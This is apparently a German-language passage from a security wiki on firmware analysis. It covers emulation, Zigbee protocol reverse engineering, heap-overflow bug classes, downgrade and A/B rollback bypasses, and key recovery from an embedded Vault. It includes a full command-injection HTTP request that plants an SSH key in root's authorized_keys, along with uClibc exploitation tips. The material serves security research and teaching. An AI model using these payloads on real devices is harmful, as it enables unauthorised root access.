Tools wie [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) und andere ermöglichen die vollständige Firmware-Emulation, automatisieren den Prozess und unterstützen die dynamische Analyse.

### Rekonstruktion aufgeteilter und verifizierter Root-Dateisysteme für die Emulation

Wenn ein SquashFS-Superblock lesbar ist, die Offsets der Inode-, Verzeichnis- oder Fragmenttabellen jedoch unmöglich sind, sollte `unsquashfs` nicht sofort gepatcht werden. Reverse-engineere stattdessen die frühe Boot-Binärdatei und bilde den von ihr erstellten Blockgerätegraphen nach: Eingebettete Systeme können zwar eine nominelle Root-Partition bereitstellen, das tatsächliche Dateisystem jedoch mit einem `dm-linear`-Mapping erstellen, das Sektoren aus einer anderen Partition anhängt. Prüfungen, die nur den Superblock betreffen, können erfolgreich sein, obwohl alle nachfolgenden Metadatenblöcke verschoben sind.<sup>[[11]](#references)</sup>

Bewahre die Arithmetik der Firmware exakt. Ermittle insbesondere, ob Längen in Bytes, 512-Byte-Sektoren oder 4-KiB-Seiten angegeben sind; bilde Shifts und Abschneidungen in ihrer ursprünglichen Reihenfolge nach; und berücksichtige bankabhängige Endbereiche in A/B-Layouts. Zum Beispiel schneidet `(partition_bytes >> 12) << 3` zunächst auf eine 4-KiB-Grenze ab und gibt das Ergebnis erst anschließend in 512-Byte-Sektoren an. Wird dies durch `partition_bytes // 512` ersetzt, kann sich der angehängte Bereich um einige Kilobyte verschieben und alle nachfolgenden SquashFS-Tabellen beschädigen.<sup>[[11]](#references)</sup>

Ein nützlicher Validierungsprozess ist:<sup>[[11]](#references)</sup>

1. Ermittle aus der Verifier-/Init-Binärdatei das Quellgerät, den Startsektor und die Länge jedes `dm-linear`-Segments.
2. Verknüpfe oder mappe die Bereiche, ohne ihre Ausrichtung zu verändern.
3. Schlägt die Extraktion weiterhin fehl, durchsuche nur einen kleinen Bereich um die vorhergesagte Grenze und verlange mehrere aufeinanderfolgende gültige Metadatenstrukturen, statt einen plausiblen Superblock allein zu akzeptieren.
4. Führe ein unverändertes `unsquashfs` auf dem rekonstruierten Image aus. Das erfolgreiche Durchlaufen aller Verzeichnisse und Fragmente ist ein aussagekräftigerer Nachweis als `unsquashfs -stat`.

#### Vom Analysten kontrollierter dm-verity-Ersatz

Wenn der Analyst den QEMU-Kernel, die Initramfs und die virtuellen Datenträger kontrolliert, kann ein modifiziertes Root-System gestartet werden, indem die Verifizierungs-PID 1 des Herstellers durch ein kleines, statisch gelinktes Init ersetzt wird. Dies ist eine **Boot-Chain-Substitution im Labor**, kein Brechen von dm-verity, seiner RSA-Signatur, Secure Boot oder eines mit einem TPM versiegelten Schlüssels.<sup>[[11]](#references)</sup>

Das Ersatz-Init sollte die betrieblichen Schritte des ursprünglichen Boot-Pfads nachbilden: `devtmpfs` einhängen, `setsid()` aufrufen, `/dev/console` mit den Dateideskriptoren 0–2 verbinden, `/proc` und `/sys` einhängen, auf das bereitgestellte Blockgerät warten, das bearbeitete Root-Dateisystem schreibgeschützt einhängen, die Pseudo-Dateisysteme des alten Root-Dateisystems aushängen, den neuen Mount auf `/` verschieben, `chroot` ausführen und das ursprüngliche `/sbin/init` der Firmware mit `execve()` starten. Das Aushängen von `/dev`, `/proc` und `/sys` **vor** `MS_MOVE` verhindert, dass versehentlich Mount-Punkte des neuen Root-Dateisystems ausgehängt werden.<sup>[[11]](#references)</sup>

Halte den veränderlichen Gerätezustand getrennt vom modifizierten unveränderlichen Root-Dateisystem. Ein qcow2-Overlay kann den LVM-Zustand des ursprünglichen Datenträgers erhalten, während ein zweiter schreibgeschützter Virtio-Datenträger das bearbeitete SquashFS bereitstellt:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Debugging des Offline-Image-Zustands

Untersuche den persistenten Zustand außerhalb des Gasts, wenn langsame Bootvorgänge, destruktive Startskripte oder unzuverlässige Konsolenprotokollierung die Fehlerursache verschleiern. Hänge niemals ein Overlay ein, das eine laufende VM verwendet; stelle es mit `qemu-nbd` bereit, beschränke die LVM-Erkennung auf die vorgesehene NBD-Partition und deaktiviere die Volume Group, bevor du die Verbindung trennst.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Zur reproduzierbaren Fehlerisolierung sollten zeitgestempelte Markierungsdateien auf einem stabilen, beschreibbaren Volume gespeichert und offline überprüft werden; `/dev/kmsg`, FIFOs und kurzlebige Konsolen können durch Ratenbegrenzung oder vorzeitiges Prozessende zu falsch-negativen Ergebnissen führen. Vergleiche außerdem die exakten Schnittstellen über die verschiedenen Ebenen hinweg, bevor du nicht zusammenhängenden Code änderst: `uname -r` mit `/lib/modules/`, ext4-Funktionen auf dem Datenträger mit der Kernel-Konfiguration und die Mesa-`libGL`-Generation mit der DRI-Treiber-ABI sowie den aus der PCI-ID abgeleiteten Treibernamen. Eine Komponente kann vorhanden sein und sogar erfolgreich mit `dlopen()` geladen werden, aber trotzdem unbrauchbar bleiben, weil ihr Verbraucher eine andere ABI erwartet.<sup>[[11]](#references)</sup>

## Dynamic Analysis in Practice

In dieser Phase wird für die Analyse entweder eine reale oder eine emulierte Geräteumgebung verwendet. Es ist wichtig, Shell-Zugriff auf das Betriebssystem und das Dateisystem zu behalten. Die Emulation bildet Hardware-Interaktionen möglicherweise nicht perfekt nach, sodass gelegentliche Neustarts der Emulation erforderlich sein können. Bei der Analyse sollten das Dateisystem erneut untersucht, offengelegte Webseiten und Netzwerkdienste ausgenutzt und Bootloader-Schwachstellen erkundet werden. Firmware-Integritätstests sind entscheidend, um potenzielle Backdoor-Schwachstellen zu erkennen.

## Runtime Analysis Techniques

Bei der Laufzeitanalyse wird mit einem Prozess oder einer Binärdatei in ihrer Betriebsumgebung interagiert. Dabei kommen Tools wie gdb-multiarch, Frida und Ghidra zum Einsatz, um Breakpoints zu setzen und mithilfe von Fuzzing und anderen Techniken Schwachstellen zu identifizieren.

Bei Embedded-Zielen ohne vollständigen Debugger **kopiere einen statisch gelinkten `gdbserver`** auf das Gerät und verbinde dich remote damit:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee-/Radio-Coprozessor-Nachrichtenmapping

Bei IoT-Hubs ist der RF-Stack oft zwischen einem **Radio-MCU** und einem Linux-Userland-Prozess aufgeteilt. Ein nützlicher Workflow ist, den Pfad nachzuverfolgen:<sup>[[8]](#references)</sup>

1. **RF-Frame** über Funk
2. **Parser auf Controller-Seite** auf dem Radio-MCU
3. **serielles/UART-Text- oder TLV-Protokoll**, das an Linux weitergeleitet wird (zum Beispiel `/dev/tty*`)
4. **Application-Dispatcher** im Haupt-Daemon
5. **protokollspezifischer Handler / Zustandsautomat**

Diese Architektur schafft zwei Ziele für das Reverse Engineering statt nur eines. Wenn der Controller binäre Funkframes in ein Textprotokoll wie `Group,Command,arg1,arg2,...` umwandelt, ermittle:

- Die **Nachrichtengruppen** und Dispatch-Tabellen
- Welche Nachrichten vom **Netzwerk** und welche direkt vom Controller kommen können
- Die exakten **herstellerspezifischen Unterscheidungsfelder** (zum Beispiel Zigbee `manufacturer_code` und benutzerdefiniertes `cluster_command`)
- Welche Handler nur während **Commissioning**, Discovery oder Firmware-/Model-Download-Phasen erreichbar sind

Bei Zigbee solltest du insbesondere Pairing-Traffic mitschneiden und prüfen, ob das Ziel noch den standardmäßigen **Link Key** `ZigBeeAlliance09` verwendet. Wenn ja, kann das Mitschneiden des Commissioning-Traffics den **Network Key** offenlegen. Zigbee-3.0-Installationscodes verringern dieses Risiko. Halte daher fest, ob das getestete Gerät sie tatsächlich erzwingt.

### Herstellerspezifische Protokollhandler und durch FSM begrenzte Erreichbarkeit

Herstellerspezifische Zigbee-/ZCL-Befehle sind oft ein besseres Ziel als standardisierte Cluster, da sie **benutzerdefinierten Parsing-Code** und interne **FSMs** mit weniger erprobter Validierung ansteuern.<sup>[[8]](#references)</sup>

Praktischer Workflow:

- Analysiere den Command-Dispatcher rückwärts, bis du den **herstellerspezifischen Handler** findest.
- Ermittle die Tabellen für **FSM-Zustand**, **Ereignis**, **Prüfung**, **Aktion** und **Folgezustand**.
- Identifiziere **Übergangszustände**, die automatisch fortschreiten, sowie Retry-/Error-Zweige, die letztlich angreiferkontrollierten Zustand zurücksetzen oder freigeben.
- Stelle fest, welche legitimen Protokollaustausche erforderlich sind, um den Daemon in den verwundbaren Zustand zu versetzen, statt anzunehmen, dass der fehlerhafte Handler immer erreichbar ist.

Bei zeitkritischen Protokollen kann die Paketwiedergabe über ein Python-Framework zu langsam sein. Zuverlässiger ist es, ein legitimes Gerät auf echter Hardware (zum Beispiel einem **nRF52840**) mit einem Stack in Herstellerqualität zu emulieren, damit die korrekten **Endpoints**, **Attribute** und das richtige Commissioning-Timing verwendet werden.

### Fehlerklasse bei fragmentierten Downloads in Embedded-Daemons

Eine wiederkehrende Firmware-Fehlerklasse tritt bei **fragmentierten Blob-/Model-/Konfigurationsdownloads** auf:<sup>[[8]](#references)</sup>

1. Das **erste Fragment** (`offset == 0`) speichert `ctx->total_size` und alloziert `malloc(total_size)`.
2. Spätere Fragmente validieren nur die vom Angreifer kontrollierten **paketlokalen** Felder, etwa `packet_total_size >= offset + chunk_len`.
3. Beim Kopieren wird `memcpy(&ctx->buffer[offset], chunk, chunk_len)` verwendet, ohne die **ursprünglich alloziierte Größe** zu prüfen.

Ein Angreifer kann dadurch Folgendes senden:

- Ein erstes gültiges Fragment mit einer **kleinen** angegebenen Gesamtgröße, um eine kleine Heap-Allokation zu erzwingen.
- Ein späteres Fragment mit dem **erwarteten Offset**, aber einem größeren `chunk_len`.
- Eine gefälschte paketlokale Größe, die die erneuten Prüfungen besteht und trotzdem den ursprünglich allozierten Buffer überlaufen lässt.

Wenn der verwundbare Pfad hinter der Commissioning-Logik liegt, muss der Exploit genug **Geräteemulation** enthalten, um das Ziel vor dem Senden der fehlerhaften Fragmente in den erwarteten Model-Download- oder Blob-Download-Zustand zu versetzen.

### Durch Protokoll ausgelöste `free()`-Aufrufe

Bei Embedded-Daemons lässt sich Heap-Metadaten-Ausnutzung oft am einfachsten nicht durch „auf die Bereinigung warten“, sondern durch **Erzwingen der protokolleigenen Fehlerbehandlung** auslösen:<sup>[[8]](#references)</sup>

- Sende fehlerhafte Folgefragmente, um die FSM in **Retry-** oder **Error-Zustände** zu bringen.
- Überschreite den Retry-Grenzwert, sodass der Daemon den **Kontext zurücksetzt** und den beschädigten Buffer freigibt.
- Nutze diesen vorhersehbaren `free()`-Aufruf, um Allocator-Primitives auszulösen, bevor der Prozess aus anderen Gründen abstürzt.

Das ist besonders nützlich bei **musl-/uClibc-/dlmalloc-artigen** Allocators in Embedded Linux, wo beschädigte Chunk-Metadaten die Unlink-/Unbin-Logik in ein Write-Primitive verwandeln können. Ein stabiles Muster ist, ein **Size-Feld** zu beschädigen, um die Traversierung des Allocators auf **Fake-Chunks innerhalb des übergelaufenen Buffers** umzuleiten, statt sofort echte Bin-Pointer zu überschreiben und den Prozess zum Absturz zu bringen.

## Binary Exploitation und Proof-of-Concept

Die Entwicklung eines PoC für identifizierte Schwachstellen erfordert ein tiefes Verständnis der Zielarchitektur und Programmierung in Low-Level-Sprachen. Binäre Laufzeitschutzmechanismen sind in Embedded-Systemen selten, aber falls vorhanden, können Techniken wie Return Oriented Programming (ROP) erforderlich sein.

### Hinweise zur uClibc-Fastbin-Ausnutzung (Embedded Linux)

- **Fastbins + Konsolidierung:** uClibc verwendet Fastbins, ähnlich wie glibc. Eine spätere große Allokation kann `__malloc_consolidate()` auslösen. Daher muss jeder Fake-Chunk Prüfungen bestehen (plausible Größe, `fd = 0` und umgebende Chunks müssen als „in use“ erkannt werden).<sup>[[6]](#references)</sup>
- **Nicht-PIE-Binärdateien unter ASLR:** Wenn ASLR aktiviert ist, die Haupt-Binärdatei aber **nicht PIE** ist, sind die Adressen innerhalb der Binärdatei in `.data/.bss` stabil. Du kannst einen Bereich anvisieren, der bereits einem gültigen Heap-Chunk-Header ähnelt, um eine Fastbin-Allokation auf eine **Funktionszeigertabelle** umzuleiten.
- **NUL-Byte zum Stoppen des Parsers:** Wird JSON geparst, kann ein `\x00` im Payload das Parsing beenden und zugleich nachfolgende angreiferkontrollierte Bytes für einen Stack Pivot oder eine ROP-Chain erhalten.
- **Shellcode über `/proc/self/mem`:** Eine ROP-Chain, die `open("/proc/self/mem")`, `lseek()` und `write()` aufruft, kann ausführbaren Shellcode in einem bekannten Mapping platzieren und dorthin springen.

## Vorbereitete Betriebssysteme für Firmware-Analyse

Betriebssysteme wie [AttifyOS](https://github.com/adi0x90/attifyos) und [EmbedOS](https://github.com/scriptingxss/EmbedOS) bieten vorkonfigurierte Umgebungen für Firmware-Sicherheitstests, die mit den benötigten Tools ausgestattet sind.

## Vorbereitete Betriebssysteme zur Firmware-Analyse

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS ist eine Distribution, die dich bei der Sicherheitsbewertung und beim Pentesting von Internet-of-Things-Geräten (IoT) unterstützt. Sie spart viel Zeit, indem sie eine vorkonfigurierte Umgebung mit allen erforderlichen Tools bereitstellt.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Ein auf Ubuntu 18.04 basierendes Betriebssystem für Embedded-Sicherheitstests, das mit Tools für Firmware-Sicherheitstests vorinstalliert ist.

## Firmware-Downgrade-Angriffe und unsichere Update-Mechanismen

Selbst wenn ein Hersteller kryptografische Signaturprüfungen für Firmware-Images implementiert, fehlt häufig der **Schutz vor Versions-Rollback (Downgrade)**. Wenn der Boot- oder Recovery-Loader die Signatur nur mit einem eingebetteten öffentlichen Schlüssel prüft, aber nicht die *Version* (oder einen monotonen Zähler) des zu flashenden Images vergleicht, kann ein Angreifer auf legitime Weise **ältere, verwundbare Firmware mit gültiger Signatur installieren** und so bereits behobene Schwachstellen wieder einführen.<sup>[[4]](#references)</sup>

Typischer Angriffsablauf:

1. **Ein älteres signiertes Image beschaffen**
   * Lade es vom öffentlichen Download-Portal, CDN oder Supportbereich des Herstellers herunter.
   * Extrahiere es aus zugehörigen Mobile-/Desktop-Anwendungen (z. B. aus `assets/firmware/` innerhalb eines Android-APK).
   * Beziehe es aus Drittanbieter-Repositories wie VirusTotal, Internetarchiven, Foren usw.
2. **Das Image über einen verfügbaren Update-Kanal zum Gerät hochladen oder bereitstellen:**
   * Web-UI, Mobile-App-API, USB, TFTP, MQTT usw.
   * Viele IoT-Geräte für Verbraucher stellen *nicht authentifizierte* HTTP(S)-Endpunkte bereit, die Base64-kodierte Firmware-Blobs annehmen, serverseitig dekodieren und eine Wiederherstellung oder ein Upgrade auslösen.
3. Nach dem Downgrade eine Schwachstelle ausnutzen, die in einer neueren Version behoben wurde (zum Beispiel einen später hinzugefügten Filter gegen Command Injection).
4. Optional nach Erlangung von Persistenz wieder das neueste Image flashen oder Updates deaktivieren, um nicht entdeckt zu werden.

### Beispiel: Command Injection nach einem Downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

In der anfälligen (downgradeten) Firmware wird der Parameter `md5` ohne Bereinigung direkt an einen Shell-Befehl angehängt, wodurch sich beliebige Befehle einschleusen lassen (hier: SSH-Zugriff als root per Schlüssel aktivieren). Spätere Firmware-Versionen führten einen einfachen Zeichenfilter ein. Da jedoch ein Downgrade-Schutz fehlt, ist die Behebung wirkungslos.<sup>[[4]](#references)</sup>

### Firmware aus mobilen Apps extrahieren

Viele Anbieter bündeln vollständige Firmware-Images in ihren mobilen Begleit-Apps, damit die App das Gerät über Bluetooth/Wi-Fi aktualisieren kann. Diese Pakete sind in der APK/APEX häufig unverschlüsselt unter Pfaden wie `assets/fw/` oder `res/raw/` gespeichert. Mit Tools wie `apktool`, `ghidra` oder sogar einfachem `unzip` lassen sich signierte Images extrahieren, ohne die physische Hardware anzufassen.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Updater-only-Bypass des Anti-Rollback-Schutzes bei A/B-Slot-Designs

Einige Hersteller implementieren zwar einen **Anti-Downgrade-Ratchet**, aber nur innerhalb der *Updater*-Logik (zum Beispiel eine UDS-Routine über CAN, einen Recovery-Befehl oder einen OTA-Agent im Userspace). Prüft der **Bootloader** später nur die Image-Signatur/CRC und vertraut der Partitionstabelle oder den Slot-Metadaten, lässt sich der Rollback-Schutz weiterhin umgehen.<sup>[[7]](#references)</sup>

Typisches schwaches Design:

- Firmware-Metadaten enthalten sowohl einen Versionsdeskriptor als auch einen **Security-Ratchet** / monotonen Zähler.
- Der Updater vergleicht den Image-Ratchet mit einem persistent gespeicherten Wert und weist ältere signierte Images zurück.
- Der Bootloader **wertet diesen Ratchet nicht aus** und prüft vor dem Booten des ausgewählten Slots nur Header, CRC und Signatur.
- Die Slot-Aktivierung wird separat in einer Partitionstabelle oder einem Generation-Zähler pro Slot gespeichert und ist **nicht kryptografisch an den exakten Digest der validierten Firmware gebunden**.

Dadurch entsteht bei Dual-Slot-Systemen ein Primitiv nach dem Muster **ein Image validieren / ein anderes Image booten**. Kann der Angreifer den Updater dazu bringen, Slot B mithilfe eines aktuellen signierten Images als nächstes Boot-Ziel zu markieren und Slot B anschließend vor dem Neustart überschreiben, bootet der Bootloader möglicherweise trotzdem das ältere Image, weil er nur den bereits gespeicherten Slot-Metadaten vertraut.

Häufiges Missbrauchsmuster:

1. Eine **aktuelle signierte** Firmware in den passiven Slot hochladen und die normale Validierungs-/Umschaltroutine ausführen, sodass das Layout diesen Slot als nächstes aktives Ziel markiert.
2. **Noch nicht neu starten**. In derselben Sitzung die Slot-Vorbereitungs-/Löschroutine erneut aufrufen.
3. Veraltete Boot-Status- oder Slot-Auswahl-Logik ausnutzen, sodass der Updater **denselben physischen Slot** löscht, der gerade aktiviert wurde.
4. Eine **ältere, aber weiterhin signierte** Firmware in diesen Slot schreiben.
5. Die Validierungsroutine umgehen, die den Ratchet durchsetzt, und direkt neu starten.
6. Der Bootloader wählt den aktivierten Slot aus, prüft nur Signatur/Integrität und bootet das alte Image.

Worauf beim Reverse Engineering von A/B-Update-Implementierungen zu achten ist:

- Slot-Auswahl anhand von **Boot-Zeit-Flags**, die nach einer erfolgreichen Umschaltung nicht aktualisiert werden.
- Eine Routine vom Typ `prepare_passive_slot()`, die anhand eines veralteten Status einen Slot löscht statt anhand des **aktuell gespeicherten Layouts**.
- Eine Funktion vom Typ `part_write_layout()`, die nur einen **Generation-Zähler** / ein Aktiv-Flag erhöht und den Hash des validierten Images nicht speichert.
- Ratchet-Prüfungen, die im Userspace oder im Updater implementiert sind, aber **nicht in ROM / Bootloader / Secure-Boot-Stufen**.
- Lösch- oder Recovery-Routinen, nach denen der Slot weiterhin als bootfähig markiert bleibt, obwohl sein Inhalt entfernt und neu geschrieben wurde.

### Checkliste zur Bewertung der Update-Logik

* Ist der Transport/die Authentifizierung des *Update-Endpunkts* angemessen geschützt (TLS + Authentifizierung)?
* Vergleicht das Gerät vor dem Flashen **Versionsnummern** oder einen **monotonen Anti-Rollback-Zähler**?
* Wird das Image innerhalb einer Secure-Boot-Kette verifiziert (z. B. Signaturprüfung durch ROM-Code)?
* Setzt der **Bootloader denselben Ratchet** wie der Updater durch, statt nur Signatur/CRC zu prüfen?
* Sind die Metadaten zur Slot-Aktivierung **an den Digest/die Version der validierten Firmware gebunden**, oder kann ein Slot nach seiner Aktivierung verändert werden?
* Wird das Gerät nach erfolgreichem Slot-Wechsel zu einem Neustart gezwungen, oder sind weitere Update-/Löschroutinen in derselben Sitzung noch erreichbar?
* Führt der Userspace-Code zusätzliche Plausibilitätsprüfungen durch (z. B. zulässige Partitionszuordnung, Modellnummer)?
* Verwenden *partielle* oder *Backup*-Update-Abläufe dieselbe Validierungslogik?

> 💡  Fehlt eines der oben genannten Schutzmerkmale, ist die Plattform wahrscheinlich anfällig für Rollback-Angriffe.

## Verwundbare Firmware zum Üben

Um das Aufspüren von Schwachstellen in Firmware zu üben, eignen sich die folgenden verwundbaren Firmware-Projekte als Ausgangspunkt.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Firmware-Entschlüsselungsschlüssel aus eingebettetem KMS-/Vault-Status wiederherstellen

Wenn ein Update-Image kleine Klartext-Metadaten mit einem großen Blob hoher Entropie kombiniert, sollte zuerst eine Container-Triage erfolgen, bevor etwas per Brute-Force angegriffen wird:<sup>[[1]](#references)</sup>

- Header, Offsets und Zeilengrenzen mit `hexdump`, `xxd`, `strings -tx`, `base64 -d` und `binwalk -E` ausgeben.
- `Salted__` weist gewöhnlich auf das OpenSSL-`enc`-Format hin: Die nächsten 8 Bytes sind der Salt, die übrigen Bytes der Chiffretext.
- Ein Base64-Feld, das zu genau `256` Bytes dekodiert wird, ist ein starker Hinweis darauf, dass es sich um einen RSA-2048-Chiffretext handelt, der ein zufälliges Firmware-Passwort/einen Sitzungsschlüssel umhüllt.
- Separates PGP-Material in derselben Datei schützt häufig nur die Authentizität. Nicht davon ausgehen, dass es der Vertraulichkeitsschutz ist.

Wenn die statische Suche nach Schlüsseln (`grep`, `strings`, PEM-/PGP-Suchen) erfolglos bleibt, sollte stattdessen der **operative Entschlüsselungspfad** zurückverfolgt werden, anstatt nur nach privaten Schlüsseln zu suchen:

- Den Updater bzw. die Verwaltungs-Binärdatei dekompilieren und verfolgen, wer den verschlüsselten Blob liest, welcher Helper/welche API ihn entschlüsselt und welchen logischen Schlüsselnamen sie anfordert.
- Das extrahierte Root-Dateisystem nach KMS-Status durchsuchen (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) sowie nach Unit-Dateien und Init-Skripten.
- Klartext-Befehle wie `vault operator unseal ...`, Recovery-Schlüssel, Bootstrap-Tokens oder lokale KMS-Auto-Unseal-Skripte wie Material für private Schlüssel behandeln.

Wenn das Gerät die originale Vault-Binärdatei und das Storage-Backend enthält, ist es gewöhnlich einfacher, diese Umgebung nachzubilden, als die Vault-Interna neu zu implementieren:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Mit root auf dem geklonten KMS:

- Transit-Schlüssel nur innerhalb des isolierten Klons exportierbar machen: `vault write transit/keys/<name>/config exportable=true`
- Den Unwrap-Schlüssel exportieren: `vault read transit/export/encryption-key/<name>`
- Den wiederhergestellten RSA-Schlüssel mit genau dem Padding-/Hash-Paar testen, das vom KMS verwendet wird. Ein fehlgeschlagener PKCS#1-v1.5-Decrypt und ein fehlgeschlagener standardmäßiger OAEP-Decrypt beweisen **nicht**, dass der Schlüssel falsch ist; viele von Vault unterstützte Abläufe verwenden OAEP mit SHA-256, während gängige Bibliotheken standardmäßig SHA-1 verwenden.
- Beginnt der Payload mit `Salted__`, den OpenSSL-KDF des Herstellers exakt nachbilden (`EVP_BytesToKey`, bei älteren Appliances oft MD5), bevor du eine AES-CBC-Entschlüsselung versuchst.

Damit wird „verschlüsselte Firmware“ zu einem allgemeineren Problem: **die operativen Schlüssel auf Appliance-Seite wiederherstellen und anschließend die exakten Unwrap- und KDF-Parameter offline nachbilden**.

## Schulungen und Zertifizierungen

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Firmware knacken mit Claude: Senior-Level-Fähigkeiten, Autonomie auf Junior-Niveau](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Methodik für Firmware-Sicherheitstests](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktisches IoT-Hacking: Der maßgebliche Leitfaden zum Angriff auf das Internet der Dinge](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Zero-Days in aufgegebener Hardware ausnutzen – Trail of Bits Blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Wie mir ein 20-Dollar-Smartgerät Zugriff auf dein Zuhause verschaffte](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Jetzt siehst du mich: Jetzt bist du gehackt](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv – Ausnutzen des Tesla Wall Connectors über dessen Ladeanschluss – Teil 2: Umgehen des Anti-Downgrade-Schutzes](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Bring es zum Blinken: Over-the-Air-Exploitation der Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [Tesla OS auf QEMU rooten, Teil 1: Entpacken](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux-Kernel-Dokumentation – dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [Tesla OS auf QEMU rooten, Teil 2: Debugging und Fehlerbehebung](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell-BIOS-Passwörter: Schwache XOR-Verschlüsselung ermöglicht die Wiederherstellung aus dem SPI-Flash (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn – Tools zur Wiederherstellung von Dell-BIOS-Passwörtern](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security — Hardware-Hacking auffrischen, Teil 2](https://voidstarsec.com/blog/brushing-up-part-2)
- [15] [Wie und warum wir die Cypherock Hardware Wallet gehackt haben: Die ganze Geschichte](https://www.darknavy.org/blog/how_and_why_we_hacked_cypherock_hardware_wallet_the_full_story/)
{{#include ../../banners/hacktricks-training.md}}
